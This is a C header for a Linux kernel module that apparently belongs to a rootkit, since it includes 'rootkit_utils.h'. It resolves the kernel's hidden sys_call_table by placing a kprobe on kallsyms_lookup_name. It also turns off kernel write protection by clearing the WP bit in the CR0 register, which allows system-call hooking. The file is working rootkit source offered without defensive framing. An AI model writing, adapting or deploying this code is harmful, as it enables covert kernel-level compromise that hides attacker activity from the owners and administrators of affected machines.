#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <asm/ptrace.h>
#include <linux/dirent.h>

#include "rootkit_utils.h"

#ifndef SYSCALL_TABLE_FETCH_H
#define SYSCALL_TABLE_FETCH_H

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

unsigned long cr0;
static unsigned long *__sys_call_table;

unsigned long *get_syscall_table(void) {
	unsigned long *syscall_table;

#ifdef KPROBE_LOOKUP
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

static inline void write_cr0_forced(unsigned long val) {
	unsigned long __force_order;
	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
	write_cr0_forced(cr0);
}

static inline void unprotect_memory(void) {
	write_cr0_forced(cr0 & ~0x00010000);
}

#endif
